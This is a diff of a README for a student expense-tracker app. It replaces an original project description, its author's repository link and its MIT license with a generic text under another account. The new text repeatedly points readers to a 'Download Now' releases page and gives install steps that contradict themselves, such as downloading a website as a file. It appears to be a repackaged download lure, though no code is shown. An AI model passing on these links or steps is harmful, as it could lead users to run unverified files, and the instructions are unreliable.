@@ -1,209 +1,81 @@
-# 💸 Budgettt — The Ultimate Student Money Tracker
+# 💸 Student-expense-tracker - Track Your Expenses with Ease
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
-![Status: Stable](https://img.shields.io/badge/Status-Stable-success)  
-![Platform: PWA](https://img.shields.io/badge/Platform-PWA%20%2B%20Extension%20%2B%20Web-blue)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kevingeorge-96/Student-expense-tracker/releases)
 
-> **Secure. Offline-First. Privacy-Focused.**  
-> A lightning-fast money tracking system built specifically for **Indian Students** — to track every rupee without data leaching.
+## 📜 Overview
 
----
+Welcome to the Student-expense-tracker! This application is designed for students who want to manage their finances without compromising their privacy. 
 
-## 🧠 Why I Built This
+It works seamlessly as:
+- A Progressive Web App (PWA)
+- A responsive website
+- A Chrome extension
 
-Like most students, I struggled with:
+Always keep track of your expenses. With Student-expense-tracker, you can manage your budget while keeping your data safe.
 
-- ❌ Forgetting where my money actually went
-- ❌ Depending on random apps filled with ads & trackers
-- ❌ Internet not always being reliable
-- ❌ No fast way to add expenses while browsing
+## 🚀 Getting Started
 
-I wanted something that was:
+Getting started with Student-expense-tracker is straightforward. Follow the steps below for a smooth installation.
 
-✅ **Fast**  
-✅ **Works offline**  
-✅ **Privacy-first**  
-✅ **Simple & distraction-free**  
-✅ **Available as a mobile app, website & browser extension**
+1. Ensure your device meets the following requirements:
+   - An Internet connection to download the app.
+   - A modern web browser like Chrome, Firefox, or Edge.
+   - A device that supports Progressive Web Apps (PWA).
 
-So I built **Budgettt** — first to solve my own problem, and now to **help every student take control of their money without giving up privacy.**
+2. **Visit this page to download:** [GitHub Releases](https://github.com/kevingeorge-96/Student-expense-tracker/releases)
 
----
+## 📥 Download & Install
 
-## ✨ What Makes Budgettt Special?
+To download Student-expense-tracker, visit the [GitHub Releases page](https://github.com/kevingeorge-96/Student-expense-tracker/releases). 
 
-- 📱 **Mobile-First & Fully Responsive**  
-  Works perfectly on **phones, tablets & desktops**.
+1. On the Releases page, look for the latest version.
+2. Click on the version number to view details about that release.
+3. Download the appropriate file based on your platform:
+   - For the PWA or website, click the "Install" button directly in your browser.
+   - For the Chrome extension, follow the prompts that appear after installation.
 
-- ⚡ **100% Offline First (IndexedDB Powered)**  
-  Add, edit & view expenses without internet.
+Once downloaded, follow these steps to set it up:
+- **For PWA or website:** Open your browser and navigate to the location where you saved the file.
+- **For Chrome extension:** Click on the extension icon on your browser's toolbar to launch the app.
 
-- ☁️ **Optional Cloud Sync**  
-  Firebase login only when YOU want backups.
+## ⚙️ Features
 
-- 🧩 **Chrome Extension Included**  
-  Instantly add expenses while browsing with one click.
+Student-expense-tracker includes a range of features to help you manage your finances effectively:
 
-- 🔒 **Privacy at the Core**  
-  Your data stays on your device unless you choose to sync.
+- **Budget Tracking:** Set monthly budgets and track your spending.
+- **Expense Categorization:** Organize expenses by categories for better visibility.
+- **Offline Support:** Access your finances even when you’re not online.
+- **Privacy Features:** Your data is stored on your device, ensuring your privacy.
+- **User-Friendly Interface:** Simple navigation designed for everyone.
 
-- 💸 **Paise-Based Math Engine**  
-  All values stored in integers for perfect accuracy.  
-  `₹100.00 → 10000 paise`
+## 🧩 How to Use the App
 
-- 🎨 **Minimal Dark UI**  
-  Clean and premium student-focused design.
+Here is a quick guide on how to use Student-expense-tracker once it's installed:
 
----
+1. **Create an Account:** Open the app and set up your account. This is simple and only requires basic information to get started.
+  
+2. **Set Your Budget:** Input your monthly budget in the designated section. This helps you stay on track with your expenses.
 
-## 🧩 Platforms Included
+3. **Log Expenses:** Add expenses as they occur. Choose a category for each so you can see where your money goes.
 
-✅ **Progressive Web App (PWA)**  
-✅ **Chrome Extension**  
-✅ **Responsive Website (Mobile + Desktop Ready)**
+4. **Review:** At the end of the month, review your spending to understand your financial habits better.
 
-One project → Three powerful platforms 🚀
+5. **Adjust:** Use the insights from your review to adjust your budget for the next month.
 
----
+## 📝 Support & Feedback
 
-## 🎥 Live Working Demo
+Your experience matters. If you encounter any issues or have suggestions, please reach out. You can open an issue on the repository or submit feedback directly. 
 
-> Real-time working demo of Budgettt PWA & Chrome Extension.
+## 📚 Resources
 
-<video src="PASTE_YOUR_VIDEO_URL_HERE" controls width="100%"></video>
+For more information, refer to these resources:
 
-✅ Replace the URL above after uploading your video via GitHub drag & drop.
+- [User Guide](https://github.com/kevingeorge-96/Student-expense-tracker/wiki)
+- [Contributing Guidelines](https://github.com/kevingeorge-96/Student-expense-tracker/blob/main/CONTRIBUTING.md)
+- [FAQs](https://github.com/kevingeorge-96/Student-expense-tracker/wiki/FAQs)
 
----
+## 📢 Final Notes
 
-## 🚀 Getting Started (Web App / PWA)
+Thank you for choosing Student-expense-tracker. Your financial management is important, and we've designed this tool to help you with just that. Enjoy using the app and take control of your expenses with confidence.
 
-1. Open:
-   ```bash
-   web-pwa/index.html
-   ```
-2. Or run a local server:
-   ```bash
-   npx serve .
-   ```
-3. Click **“Install”** in the browser to use it like a native app.
-4. Start adding transactions immediately — **no login required!**
-
-✅ Fully works offline  
-✅ Sync only if you want
-
----
-
-## 🧩 Chrome Extension Setup
-
-1. Open Chrome:
-   ```
-   chrome://extensions
-   ```
-2. Enable **Developer Mode**
-3. Click **Load Unpacked**
-4. Select the `chrome-extension` folder
-5. **Pin it for instant access**
-
-Now you can add expenses without leaving any website 💨
-
----
-
-## 🛠️ Tech Stack & Architecture
-
-Built with **Pure Vanilla Web Technologies** — no frameworks, no bloat.
-
-### ⚙️ Frontend
-
-- HTML5
-- CSS3
-- ES6 JavaScript
-
-### 💾 Storage
-
-- **Local:** IndexedDB
-- **Cloud:** Firebase Firestore
-
-### 🧠 Core Architecture
-
-- Shared logic inside `/core`
-- Used by both:
-  - PWA
-  - Chrome Extension
-
-### 💸 Financial Engine
-
-- Integer-based calculations
-- No floating point bugs
-- Accurate monthly summaries
-
----
-
-## 📁 Project Structure
-
-```txt
-/core              → Shared database, auth & sync logic
-/web-pwa           → Main Progressive Web App
-/chrome-extension  → Lightweight browser popup
-```
-
-> ⚠️ Chrome Extensions need sandbox isolation, so `/core` is duplicated safely.
-
----
-
-## 👩‍💻 Who Is This For?
-
-- 🎓 College Students
-- 🧑‍💻 Developers learning:
-  - PWAs
-  - IndexedDB
-  - Browser Extensions
-  - Offline-first architecture
-- 🛡️ Privacy-conscious users
-- 🚀 Open-source contributors & GSoC aspirants
-
----
-
-## 🌱 Open Source & Contributions
-
-This project is **fully open-source & beginner-friendly**.
-
-You can contribute by:
-
-- Improving UI/UX
-- Adding charts & analytics
-- UPI auto-expense detection
-- Multi-language support
-- AI-based monthly suggestions
-- Improving sync performance
-
-✨ Perfect for **Hackathons, GSoC prep & Open Source learning**
-
----
-
-## 🔗 Repository
-
-GitHub Repo:  
-👉 https://github.com/TarunyaProgrammer/Student-expense-tracker
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License** — free to use, modify & distribute.
-
----
-
-## ❤️ Final Note
-
-This project started as a **personal struggle**, but my goal is bigger now:
-
-> 🎯 **To help students take control of their money without sacrificing privacy.**
-
-If this project helped you even a little:
-
-⭐ Star the repo  
-🍴 Fork it  
-🧑‍💻 Contribute to it
-
-Let’s build something impactful together 🚀
+Remember, to start using the application, **visit this page to download:** [GitHub Releases](https://github.com/kevingeorge-96/Student-expense-tracker/releases).
